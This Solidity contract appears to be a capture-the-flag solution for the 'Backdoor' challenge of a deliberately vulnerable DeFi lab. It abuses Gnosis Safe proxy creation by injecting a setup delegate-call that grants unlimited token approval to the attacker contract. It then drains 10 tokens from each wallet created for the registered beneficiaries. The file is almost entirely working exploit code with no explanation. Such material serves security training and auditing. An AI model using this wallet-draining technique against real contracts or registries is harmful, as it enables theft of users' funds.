// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import "forge-std/Test.sol";


contract GSafeBackdoor is Test{
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    GnosisSafe internal masterCopy;
    DamnValuableToken internal dvt;
    address payable attacker;

    constructor(
        address payable _attacker,
        address _walletFactory,
        address _walletRegistry,
        address payable _masterCopy,
        address _dvt
    ) {
        walletFactory = GnosisSafeProxyFactory(_walletFactory);
        walletRegistry = WalletRegistry(_walletRegistry);
        masterCopy = GnosisSafe(_masterCopy);
        dvt =  DamnValuableToken(_dvt);
        attacker = _attacker;
    }

    // execute in proxy context and state - no access to this storage
    function allowExploit(address spender,address _dvt) external{
        DamnValuableToken(_dvt).approve(spender,type(uint256).max);
    }

    function perform(address[] calldata users) external{
        for(uint256 i; i < users.length; i++){
            exploit(users[i]);
        }
    }

    function exploit(address _beneficiary) internal {
        address[] memory owners = new address[](1);
        owners[0] = _beneficiary;

        // encode setUp on Gsafe
        bytes memory _setUpData = abi.encodeWithSelector(
            GnosisSafe.setup.selector,
            owners,
            uint256(1), // threshold
            address(this),
            abi.encodeWithSelector(
                GSafeBackdoor.allowExploit.selector,
                address(this),
                address(dvt)
            ),
            address(0),
            address(0),
            uint256(0),
            address(0)
        );

        (GnosisSafeProxy proxy) = walletFactory.createProxyWithCallback(
            address(masterCopy), // singleton
            _setUpData,
            69, // salt
            IProxyCreationCallback(walletRegistry)
        );

        dvt.transferFrom(address(proxy), attacker,10e18);
    }
}